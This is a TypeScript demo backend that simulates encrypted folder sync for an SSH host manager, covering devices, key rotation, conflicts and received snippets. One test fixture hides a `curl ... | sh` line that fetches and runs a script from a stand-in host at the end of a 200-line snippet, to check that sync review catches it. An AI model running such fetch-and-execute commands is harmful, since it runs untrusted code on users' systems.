// Demo (browser preview only): the encrypted folder sync (phase 11). Never
// used inside the desktop app.
//
// URL switches: `?sync=off` (default: the wizard; `?syncfolder=join` picks a
// folder that already holds a sync, `?syncfolder=incomplete` one still
// downloading), `?sync=on` (synced, with a tags conflict, a snippet
// conflict, two received hosts, a received snippet and two issues),
// `?sync=locked`, `?sync=alert`, `?sync=unavailable`, `?sync=syncing`,
// `?sync=waiting`; `?syncsnippet=long` makes the received snippet a
// 200-line script (its review needs scrolling to the end). Passphrases: anything works but "wrong"; typed ones need
// 4 words or 20 characters (a rough stand-in for the core's estimate).
//
// Key rotation (S2c-1): `?sync=rotated` (keys changed on another device;
// `&syncnewer=1` adds a file claiming newer keys, `&syncremember=0` asks the
// previous passphrase first: one starting with "old" is taken as it),
// `?sync=conflict` (two rotations; the other device's passphrase "removed"
// gets the E2 refusal), `?sync=forgotten`, `?sync=revoked` (a device relays
// a removed device's changes, values held in Received), `?sync=pending`
// (rotation waiting for the folder), `?sync=newkeys` (a device still on the
// old keys), `?sync=tampered`; `?syncfolder=rejoin` joins a bundle this
// device held before. A rotation refuses the new passphrase "reused words
// here again" (`sync_passphrase_reused`); `&syncfolderdown=1` leaves it
// pending, `&syncfolderslow=1` answers after the 60 s limit (the rotation
// still happens; a conflict choice does not).
import type {
  EngineEvent,
  ErrorSummary,
  FolderProbe,
  GeneratedPassphrase,
  JoinBulkChoice,
  JoinPreview,
  NewPassphrase,
  ForgetPreview,
  NewerEpochFile,
  PendingHostChange,
  PickedFolder,
  RevokedValueItem,
  RotationOutcome,
  RotationPreview,
  SyncKeyEntry,
  SyncConflict,
  SyncDevice,
  SyncIssue,
  SyncOverview,
  SyncResolution,
  SyncStatus,
  UnconfirmedSnippet,
} from "./api";
import type { SyncBackend } from "./backend";

const params = new URLSearchParams(location.search);
const fail = (code: string, message: string, hint: string | null = null): ErrorSummary => ({ code, message, hint });
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const nowSecs = () => Math.floor(Date.now() / 1000);

const WORDS = ["harbor", "quartz", "lantern", "meadow", "copper", "ember", "violet", "summit", "willow", "anchor", "saffron", "tundra"];

export function demoSync(emit: (e: EngineEvent) => void) {
  const scenario = params.get("sync") ?? "off";
  const LAPTOP = "studio-mac (3f9c0ae1)";
  const DESKTOP = "workstation (a07d51c2)";
  const THIS = "demo-laptop (6b21e0f4)";

  let folder: string | null = null;
  let generated: { token: string; text: string } | null = null;
  let nextToken = 1;
  let devices: SyncDevice[] = [];
  let conflicts: SyncConflict[] = [];
  let issues: SyncIssue[] = [];
  let pending: PendingHostChange[] = [];
  let snippets: UnconfirmedSnippet[] = [];
  let rememberKey = params.get("syncremember") !== "0";
  let held: RevokedValueItem[] = [];
  let newer: NewerEpochFile[] = [];
  let keyEntries: SyncKeyEntry[] = [];
  let previousOpened = false;
  const PHONE = "old-phone (5d0e9b33)";
  let thisDevice = THIS;
  let lastPass = nowSecs() - 120;
  /** The key epoch in use (the old keys of this sync are 1). */
  let epoch = 2;

  const HELD_TAIL: RevokedValueItem = {
    key: "held:snippet:tail-logs",
    subject: { type: "snippet", id: "tail-logs" },
    device: null,
    local: { type: "snippet", value: { name: "Tail logs", command: "journalctl -fu nginx", description: null, run: true } },
    synced: null,
    hash: "held-tail-logs-1",
  };
  const device = (label: string, id: string, extra: Partial<SyncDevice> = {}): SyncDevice => ({
    id: `${id}${"0".repeat(24)}`,
    name: label.replace(/ \(.*\)$/, ""),
    label,
    this_device: label === thisDevice,
    seq: 42,
    published_at: nowSecs() - 300,
    last_seen: nowSecs() - 240,
    stale: false,
    revoked: false,
    ...extra,
  });

  function fill() {
    folder = "~/Library/Mobile Documents/com~apple~CloudDocs/Portico";
    devices = [
      device(THIS, "6b21e0f4", { this_device: true, last_seen: null }),
      device(LAPTOP, "3f9c0ae1"),
      device(DESKTOP, "a07d51c2", { published_at: nowSecs() - 86400 * 200, last_seen: nowSecs() - 86400 * 200, stale: true }),
    ];
    conflicts = [
      {
        id: "c-tags-db",
        sides_hash: "demo-sides-tags-db",
        subject: { type: "host_meta", alias: "db-prod", field: "tags" },
        sides: [
          { index: 0, devices: [THIS], local: true, at: nowSecs() - 900, value: { type: "tags", value: ["prod", "db"] } },
          { index: 1, devices: [LAPTOP], local: false, at: nowSecs() - 600, value: { type: "tags", value: ["prod", "postgres"] } },
        ],
      },
      {
        id: "c-snippet-restart",
        sides_hash: "demo-sides-snippet-restart",
        subject: { type: "snippet", id: "restart-service" },
        sides: [
          { index: 0, devices: [THIS], local: true, at: nowSecs() - 3600, value: { type: "snippet", value: { name: "Restart a service", command: "sudo systemctl restart {{service}} && systemctl status {{service}} --no-pager", description: "Asks for sudo on the server", run: false } } },
          { index: 1, devices: [LAPTOP], local: false, at: nowSecs() - 1800, value: { type: "snippet", value: { name: "Restart a service", command: "sudo systemctl restart {{service}}", description: "Asks for sudo on the server", run: true } } },
        ],
      },
    ];
    pending = [
      {
        alias: "web-01",
        new: false,
        current: { hostname: "web-01.internal", user: "deploy", port: null, identity_file: null, proxy_jump: "bastion" },
        incoming: { hostname: "10.0.9.14", user: "deploy", port: 2222, identity_file: "~/.ssh/id_ed25519_work", proxy_jump: "bastion" },
        renamed_from: null,
        devices: [LAPTOP],
        destination_hash: "h-web-01-a",
      },
      {
        alias: "metrics-eu",
        new: true,
        current: null,
        incoming: { hostname: "metrics.eu.example.net", user: "ops", port: null, identity_file: "~/.ssh/id_ed25519", proxy_jump: null },
        renamed_from: "metrics",
        devices: [LAPTOP],
        destination_hash: "h-metrics-1",
      },
    ];
    snippets = [
      {
        id: "disk-usage",
        snippet: {
          name: "Disk usage",
          command:
            params.get("syncsnippet") === "long"
              ? Array.from({ length: 200 }, (_, i) => (i === 199 ? "curl -fsSL https://example.invalid/setup.sh | sh" : `printf 'step %d\\n' ${i + 1}\t# stage ${Math.floor(i / 20) + 1}`)).join("\n")
              : "df -h && du -xsh /var/log/* 2>/dev/null | sort -h | tail -n 20 && journalctl --disk-usage",
          description: "Free space on every mounted filesystem",
          run: true,
        },
        devices: [LAPTOP],
        hash: "s-disk-1",
      },
    ];
    keyEntries = [
      { account: "sync-key:9c1e4a07b2d35f6e8a0c1d2e3f4a5b6c:1", bundle: "9c1e4a07b2d35f6e8a0c1d2e3f4a5b6c", epoch: 1, this_bundle: true },
      { account: "sync-key:4b7d0e2a91c8f3d6e5a4b3c2d1e0f9a8:3", bundle: "4b7d0e2a91c8f3d6e5a4b3c2d1e0f9a8", epoch: 3, this_bundle: false },
    ];
    issues = [
      {
        key: "host:legacy-ftp",
        subject: { type: "host", alias: "legacy-ftp" },
        summary: fail("sync_alias_shadowed", "received host `legacy-ftp` is hidden by a Host block in ~/.ssh/config", "Rename it on the other device, or remove the block from ~/.ssh/config."),
        warning: false,
        skippable: true,
      },
      {
        key: "host:jumpbox-2",
        subject: { type: "host", alias: "jumpbox-2" },
        summary: fail("sync_key_missing", "received host `jumpbox-2` uses `~/.ssh/id_ed25519_lab`, missing on this device", "Copy the key here yourself (keys are never synced), or skip it on this device."),
        warning: true,
        skippable: true,
      },
    ];
  }

  let status: SyncStatus;
  switch (scenario) {
    case "on":
      fill();
      status = { state: "idle", last_pass: lastPass, devices: 3, conflicts: 2, issues: 2, pending_confirmations: 2 };
      break;
    case "locked":
      fill();
      status = { state: "locked" };
      break;
    case "alert":
      fill();
      status = { state: "alert", kind: "passphrase_changed", device: LAPTOP };
      break;
    case "unavailable":
      fill();
      status = { state: "folder_unavailable", reason: "not_mounted" };
      break;
    case "syncing":
      fill();
      status = { state: "syncing" };
      break;
    case "waiting":
      fill();
      status = { state: "waiting", reason: "placeholder", device: LAPTOP };
      break;
    case "rotated":
      fill();
      status = { state: "alert", kind: "keys_rotated_elsewhere", device: LAPTOP };
      if (params.get("syncnewer") === "1") {
        newer = [{ device: `a07d51c2${"0".repeat(24)}`, label: DESKTOP, file: `devices/a07d51c2${"0".repeat(24)}.snap`, epoch: 3, fingerprint: "f-newer-1" }];
      }
      break;
    case "conflict":
      fill();
      status = { state: "alert", kind: "rotation_conflict", device: LAPTOP };
      break;
    case "forgotten":
      fill();
      status = { state: "alert", kind: "device_forgotten", device: LAPTOP };
      break;
    case "revoked":
      fill();
      status = { state: "alert", kind: "revoked_writes", device: DESKTOP };
      held = [
        {
          key: "held:host:db-prod",
          subject: { type: "host", alias: "db-prod" },
          device: PHONE,
          local: { type: "host", value: { hostname: "10.0.4.99", user: "postgres", port: 2222, identity_file: null, proxy_jump: null } },
          synced: { type: "host", value: { hostname: "10.0.4.12", user: "postgres", port: null, identity_file: null, proxy_jump: null } },
          hash: "held-db-prod-1",
        },
        {
          key: "held:meta:web-01:tags",
          subject: { type: "host_meta", alias: "web-01", field: "tags" },
          device: PHONE,
          local: { type: "tags", value: ["prod", "web", "public"] },
          synced: { type: "tags", value: ["prod", "web"] },
          hash: "held-web-01-tags-1",
        },
        HELD_TAIL,
      ];
      break;
    case "pending":
      fill();
      status = { state: "waiting", reason: "rotation_pending", device: null };
      break;
    case "newkeys":
      fill();
      status = { state: "waiting", reason: "needs_new_keys", device: DESKTOP };
      break;
    case "tampered":
      fill();
      status = { state: "alert", kind: "bundle_tampered", device: null };
      break;
    default:
      status = { state: "disabled" };
  }

  const idle = (): SyncStatus => ({
    state: "idle",
    last_pass: lastPass,
    devices: devices.length,
    conflicts: conflicts.length,
    issues: issues.length,
    pending_confirmations: pending.length,
  });

  function set(next: SyncStatus): SyncStatus {
    status = next;
    emit({ type: "sync", status });
    return status;
  }

  function strength(text: string) {
    const words = text.trim().split(/\s+/).filter(Boolean).length;
    const bits = Math.min(140, Math.round(text.length * 2.6 + words * 6));
    return { estimatedBits: bits, dicewareWords: 0, acceptable: words >= 4 || text.length >= 20 };
  }

  function checkNew(p: NewPassphrase) {
    if (p.kind === "generated") {
      if (!generated || generated.token !== p.token) throw fail("sync_generated_used", "this generated passphrase is no longer available", "Generate a new one, or type your own.");
      generated = null;
      return;
    }
    if (!strength(p.value).acceptable) throw fail("sync_passphrase_weak", "this passphrase is too easy to guess", "Use at least 5 random words, or generate one.");
  }

  const pendingChanged = () => emit({ type: "sync_pending_changed" });
  // The core's own words (sync/mod.rs): the dialogs choose their hint by code.
  const reusedRefusal = () =>
    fail("sync_passphrase_reused", "this sync passphrase opens older sync keys", "This passphrase opens older keys: choose another one (rotation), or type nothing if you did not change the keys (adoption).");
  /** `&syncfolderslow=1`: the folder answers after the 60 s limit (A4). */
  const slow = params.get("syncfolderslow") === "1";
  const timedOut = () => fail("sync_folder_timeout", "the sync folder did not answer within 60 seconds", "The folder is slow or stalled (network drive, files being downloaded). Portico retries later.");
  /** What the core does on its limit: "folder unavailable" until the job ends. */
  function late(apply: () => void) {
    set({ state: "folder_unavailable", reason: "not_mounted" });
    setTimeout(apply, 2500);
    return timedOut();
  }
  const unlocked = () => status.state !== "locked" && status.state !== "disabled";

  const backend: SyncBackend = {
    syncStart: async () => {},
    syncStatus: async (): Promise<SyncOverview> => ({
      status,
      folder: status.state === "disabled" ? null : folder,
      device: status.state === "disabled" ? null : thisDevice,
      rememberKey,
      epoch: status.state === "disabled" ? null : epoch,
    }),
    async syncNow() {
      if (status.state === "disabled") throw fail("sync_disabled", "sync is off on this device", "Set it up from Sync….");
      if (status.state === "locked") throw fail("sync_locked", "the sync key is not available", "Unlock sync with its passphrase.");
      set({ state: "syncing" });
      await sleep(900);
      lastPass = nowSecs();
      return set(idle());
    },
    syncDevices: async () => structuredClone(devices),
    syncConflicts: async () => structuredClone(conflicts),
    syncIssues: async () => structuredClone(issues),
    syncPendingHosts: async () => structuredClone(pending),
    syncedSnippetsUnconfirmed: async () => structuredClone(snippets),
    syncDefaultDeviceName: async () => "demo-laptop",
    async syncPickFolder(): Promise<PickedFolder | null> {
      await sleep(250);
      const which = params.get("syncfolder");
      const probe: FolderProbe =
        which === "join" || which === "rejoin" ? { kind: "existing_bundle", devices: 2 } : which === "incomplete" ? { kind: "incomplete" } : { kind: "usable" };
      folder = which === "join" || which === "rejoin" ? "~/Dropbox/Portico" : "~/Library/Mobile Documents/com~apple~CloudDocs/Portico";
      return { display: folder, probe };
    },
    async syncProbeAgain() {
      await sleep(300);
      if (!folder) throw fail("sync_no_folder", "no sync folder chosen", "Choose the folder first.");
      return params.get("syncfolder") === "incomplete" ? { kind: "incomplete" } : { kind: "existing_bundle", devices: 2 };
    },
    async syncGeneratePassphrase(): Promise<GeneratedPassphrase> {
      const pick = [...WORDS].sort(() => Math.random() - 0.5).slice(0, 6);
      generated = { token: `demo-${nextToken++}`, text: pick.join(" ") };
      return { ...generated, strength: { estimatedBits: 77, dicewareWords: 6, acceptable: true } };
    },
    syncForgetGenerated: async () => {
      generated = null;
    },
    syncAssessPassphrase: async (text) => strength(text),
    async syncCreate(passphrase, deviceName, remember) {
      checkNew(passphrase);
      if (!folder) throw fail("sync_no_folder", "no sync folder chosen", "Choose the folder first.");
      await sleep(1200);
      thisDevice = `${deviceName} (6b21e0f4)`;
      rememberKey = remember;
      devices = [device(thisDevice, "6b21e0f4", { this_device: true })];
      lastPass = nowSecs();
      return set(idle());
    },
    async syncJoinPreview(passphrase, deviceName, remember): Promise<JoinPreview> {
      await sleep(1200);
      if (passphrase === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      thisDevice = `${deviceName} (6b21e0f4)`;
      rememberKey = remember;
      return {
        token: "join-1",
        devices: [device(LAPTOP, "3f9c0ae1"), device(DESKTOP, "a07d51c2")],
        hosts: 14,
        host_meta: 22,
        snippets: 6,
        settings: 3,
        conflicts: 2,
        needs_newer: 0,
        rejoin: params.get("syncfolder") === "rejoin",
      };
    },
    async syncJoinCommit(_token: string, _bulk: JoinBulkChoice) {
      await sleep(600);
      fill();
      devices = [device(thisDevice, "6b21e0f4", { this_device: true }), ...devices.filter((d) => !d.this_device)];
      if (_bulk !== "review_each") conflicts = [];
      lastPass = nowSecs();
      pendingChanged();
      return set(idle());
    },
    async syncUnlock(passphrase) {
      await sleep(900);
      if (passphrase === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      if (status.state === "alert" && status.kind === "keys_rotated_elsewhere") {
        if (passphrase.startsWith("old") && !rememberKey && !previousOpened) {
          // RR4: the previous keys, in memory only; the new passphrase is still needed.
          previousOpened = true;
          return set(status);
        }
        if (passphrase === "reused words here again") {
          throw reusedRefusal();
        }
        if (passphrase === "lineage") {
          throw fail("sync_lineage_unknown", "the new sync keys do not continue the keys this device knows", "This device lost its record of the current keys: turn sync off, then join again as a new device.");
        }
        if (!rememberKey && !previousOpened) {
          // Adopted without the previous keys: every local difference waits (RR4).
          held = [HELD_TAIL];
          pendingChanged();
        }
        newer = [];
      }
      lastPass = nowSecs();
      return set(idle());
    },
    async syncResolve(id: string, _resolution: SyncResolution, _sidesHash: string) {
      await sleep(300);
      conflicts = conflicts.filter((c) => c.id !== id);
      emit({ type: "sync_conflicts", count: conflicts.length });
      return set(idle());
    },
    async syncSkipOnThisDevice(key) {
      issues = issues.filter((i) => i.key !== key);
      return set(idle());
    },
    async syncConfirmHosts(list) {
      for (const d of list) {
        if (!pending.some((p) => p.alias === d.alias && p.destination_hash === d.destinationHash)) {
          throw fail("sync_not_pending", `${d.alias} no longer waits for this confirmation`, "Its destination changed: review it again.");
        }
      }
      pending = pending.filter((p) => !list.some((d) => d.alias === p.alias));
      pendingChanged();
      emit({ type: "hosts_changed" });
      return set(idle());
    },
    async syncRejectHosts(list) {
      pending = pending.filter((p) => !list.some((d) => d.alias === p.alias && d.destinationHash === p.destination_hash));
      pendingChanged();
      return set(idle());
    },
    async confirmSyncedSnippet(id, hash) {
      if (!snippets.some((s) => s.id === id && s.hash === hash)) throw fail("sync_not_pending", `${id} no longer waits for this confirmation`, "Its content changed: review it again.");
      snippets = snippets.filter((s) => s.id !== id);
      pendingChanged();
    },
    async syncAcknowledgeAlerts() {
      return set(idle());
    },
    async syncChangePassphrase(old, next) {
      await sleep(900);
      if (old === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      checkNew(next);
      return set(unlocked() ? status : idle());
    },
    async syncResetPassphrase(next) {
      checkNew(next);
      await sleep(900);
      return set(idle());
    },
    async syncRenameDevice(name) {
      thisDevice = `${name} (6b21e0f4)`;
      devices = devices.map((d) => (d.this_device ? { ...d, name, label: thisDevice } : d));
      return set(status);
    },
    async syncSetOptions(remember) {
      rememberKey = remember;
      return status;
    },
    async syncDisable(_forgetKey, _removeMyFile, _leaveRoster, keepFolder) {
      await sleep(300);
      devices = [];
      conflicts = [];
      issues = [];
      pending = [];
      held = [];
      newer = [];
      keyEntries = [];
      if (!keepFolder) folder = null;
      return set({ state: "disabled" });
    },
    async syncRotationPreview(): Promise<RotationPreview> {
      await sleep(300);
      return {
        devices: devices
          .filter((d) => !d.revoked)
          .map((d) => ({
            id: d.id,
            label: d.label,
            this_device: d.this_device,
            app_version: d.label === DESKTOP ? "0.6.2" : "0.7.0",
            outdated: d.label === DESKTOP,
            waiting: false,
          })),
        outdated: devices.some((d) => d.label === DESKTOP && !d.revoked) ? [DESKTOP] : [],
        format_upgrade: true,
        exposed_accounts: [],
      };
    },
    async syncForgetPreview(deviceId): Promise<ForgetPreview> {
      await sleep(300);
      const d = devices.find((x) => x.id === deviceId);
      if (!d) throw fail("sync_device_unknown", "this device is not in the sync", "Reload the list of devices.");
      if (d.this_device) throw fail("sync_forget_self", "this device cannot forget itself", "To remove this device, use Turn sync off.");
      return {
        id: d.id,
        label: d.label,
        last_seen: d.last_seen,
        last_written: [
          { type: "host", alias: "metrics-eu" },
          { type: "host_meta", alias: "db-prod", field: "tags" },
          { type: "snippet", id: "restart-service" },
        ],
        exposed_accounts: [],
        enter_new_passphrase_on: devices.filter((x) => !x.this_device && !x.revoked && x.id !== d.id).map((x) => x.label),
      };
    },
    async syncRotateKeys(request): Promise<RotationOutcome> {
      await sleep(1400);
      if (request.authorization.kind === "current" && request.authorization.value === "wrong") {
        throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      }
      if (request.newPassphrase.kind === "typed" && request.newPassphrase.value === "reused words here again") {
        throw reusedRefusal();
      }
      checkNew(request.newPassphrase);
      rememberKey = request.rememberKey;
      const forgotten = devices.filter((d) => request.deviceIds.includes(d.id)).map((d) => d.label);
      const rotate = () => {
        devices = devices.map((d) => (request.deviceIds.includes(d.id) ? { ...d, revoked: true } : d));
        // The keys in use until now become old keys of this sync.
        keyEntries = [...keyEntries, { account: `sync-key:9c1e4a07b2d35f6e8a0c1d2e3f4a5b6c:${epoch}`, bundle: "9c1e4a07b2d35f6e8a0c1d2e3f4a5b6c", epoch, this_bundle: true }];
        epoch += 1;
        lastPass = nowSecs();
      };
      if (slow) {
        // It does finish, after the limit: the dialog must find out, not ask again.
        throw late(() => {
          rotate();
          set(idle());
        });
      }
      rotate();
      const next = params.get("syncfolderdown") === "1" ? set({ state: "waiting", reason: "rotation_pending", device: null }) : set(idle());
      return {
        epoch,
        status: next,
        enter_new_passphrase_on: devices.filter((d) => !d.this_device && !d.revoked).map((d) => d.label),
        forgotten,
        exposed_accounts: [],
      };
    },
    async syncResolveRotationConflict(choice) {
      await sleep(1200);
      if (!(status.state === "alert" && status.kind === "rotation_conflict")) {
        throw fail("sync_not_pending", "no key conflict is waiting", "Reload the list of synced changes awaiting confirmation.");
      }
      if (choice.kind === "use_other") {
        if (choice.passphrase === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
        if (choice.passphrase === "removed") {
          throw fail(
            "sync_rotation_conflict",
            `the other device's sync keys still include forgotten device ${PHONE}`,
            "The other device's keys still include a device you removed: keep this device's keys instead.",
          );
        }
      } else {
        checkNew(choice.newPassphrase);
        rememberKey = choice.rememberKey;
      }
      lastPass = nowSecs();
      // The other device's passphrase "slow": the answer comes after the limit, unchanged.
      if (slow) throw late(() => set({ state: "alert", kind: "rotation_conflict", device: LAPTOP }));
      return set(idle());
    },
    async syncRestoreBundle() {
      await sleep(700);
      if (status.state === "alert" && status.kind === "rotation_conflict") {
        throw fail("sync_rotation_conflict", "two devices changed the keys at the same time", "Two devices changed the keys at the same time: use the other device's keys or keep this device's.");
      }
      if (status.state === "waiting" && status.reason === "rotation_pending") return set(status);
      return set(idle());
    },
    syncNewerFiles: async () => structuredClone(newer),
    async syncDiscardNewerFile(deviceId, fingerprint) {
      await sleep(400);
      if (!newer.some((f) => f.device === deviceId && f.fingerprint === fingerprint)) {
        throw fail("sync_not_pending", "this file changed since it was shown", "Reload the list of synced changes awaiting confirmation.");
      }
      newer = newer.filter((f) => f.fingerprint !== fingerprint);
      // The alert stays: studio-mac really changed the keys in this demo.
      return set(status);
    },
    syncKeyEntries: async () => structuredClone(keyEntries),
    async syncRemoveKeyEntry(account) {
      await sleep(300);
      if (!keyEntries.some((k) => k.account === account)) throw fail("sync_key_entry_invalid", "not an old sync key", "Only old sync keys can be removed here.");
      keyEntries = keyEntries.filter((k) => k.account !== account);
    },
    syncRevokedValues: async () => structuredClone(held),
    async syncRevokedValue(key, _choice, hash) {
      await sleep(300);
      if (!held.some((h) => h.key === key && h.hash === hash)) {
        throw fail("sync_not_pending", `${key} no longer waits for this decision`, "Reload the list of synced changes awaiting confirmation.");
      }
      held = held.filter((h) => h.key !== key);
      pendingChanged();
      return set(held.length || status.state !== "alert" ? status : idle());
    },
  };

  return {
    backend,
    /** `run_snippet`: the core refuses an unconfirmed received snippet (F8). */
    checkRun(id: string) {
      if (snippets.some((s) => s.id === id)) {
        throw fail("sync_snippet_unconfirmed", `snippet ${id} was changed by sync and is not confirmed on this device`, "Review its command in Sync, then run it.");
      }
    },
  };
}
